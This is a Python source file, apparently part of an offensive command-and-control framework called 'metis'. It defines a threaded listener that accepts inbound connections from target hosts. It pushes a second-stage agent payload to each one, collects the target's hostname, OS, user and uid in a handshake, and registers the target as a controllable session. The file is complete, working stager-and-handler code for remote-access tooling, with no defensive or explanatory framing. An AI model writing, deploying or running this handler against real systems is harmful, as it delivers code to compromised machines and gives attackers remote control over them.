import json
import socket
import struct
import threading
from core import colors
from core.agent_payload import AGENT_CODE
from core.agent_session import MetisAgentSession

class MetisAgentHandler(threading.Thread):
    def __init__(self, lhost, lport, session_manager):
        super().__init__(daemon=True)
        self.lhost = lhost
        self.lport = lport
        self.sessions = session_manager
        self._stop = threading.Event()
        self._srv = None

    def run(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind((self.lhost, self.lport))
        except OSError as e:
            print(colors.bad(
                f"metis agent bind {self.lhost}:{self.lport} failed: {e}"
            ))
            srv.close()
            return
        try:
            srv.listen(5)
        except OSError as e:
            print(colors.bad(f"metis agent listen failed: {e}"))
            srv.close()
            return
        srv.settimeout(1.0)
        self._srv = srv
        print(colors.info(
            f"metis agent listening on {self.lhost}:{self.lport}"
        ))

        while not self._stop.is_set():
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                self._handle(conn, addr)
            except Exception as e:
                print(colors.bad(
                    f"metis agent session setup failed: {e}"
                ))
                try:
                    conn.close()
                except OSError:
                    pass

        try:
            srv.close()
        except OSError:
            pass
        self._srv = None

    def _handle(self, conn, addr):
        code = AGENT_CODE.encode()
        try:
            conn.sendall(struct.pack("!I", len(code)) + code)
        except OSError as e:
            print(colors.bad(f"metis agent stage send failed: {e}"))
            conn.close()
            return
        print(colors.dimmed(
            f"  stage ({len(code)} bytes) sent to {addr[0]}:{addr[1]}"
        ))

        conn.settimeout(15.0)
        try:
            header = self._recv_exact(conn, 4)
            n = struct.unpack("!I", header)[0]
            if n > 65536:
                raise ValueError("handshake payload too large: " + str(n))
            payload = self._recv_exact(conn, n)
            hello = json.loads(payload.decode())
        except Exception as e:
            print(colors.bad(f"metis agent handshake failed: {e}"))
            conn.close()
            return

        if hello.get("type") != "hello":
            print(colors.bad("metis agent handshake: unexpected first message"))
            conn.close()
            return

        sysinfo = hello.get("sysinfo") or {}
        session = MetisAgentSession(conn, addr, sysinfo=sysinfo)
        self.sessions.add(session)
        print(colors.dimmed(
            "  host={} os={} {} {} user={} uid={}".format(
                sysinfo.get("hostname", "?"),
                sysinfo.get("os", "?"),
                sysinfo.get("release", "?"),
                sysinfo.get("machine", "?"),
                sysinfo.get("user", "?"),
                sysinfo.get("uid", "?"),
            )
        ))

    @staticmethod
    def _recv_exact(sock, n):
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                raise ConnectionError("connection closed")
            data += chunk
        return data

    def stop(self, quiet=False):
        self._stop.set()
        srv = self._srv
        if srv is not None:
            try:
                srv.close()
            except OSError:
                pass
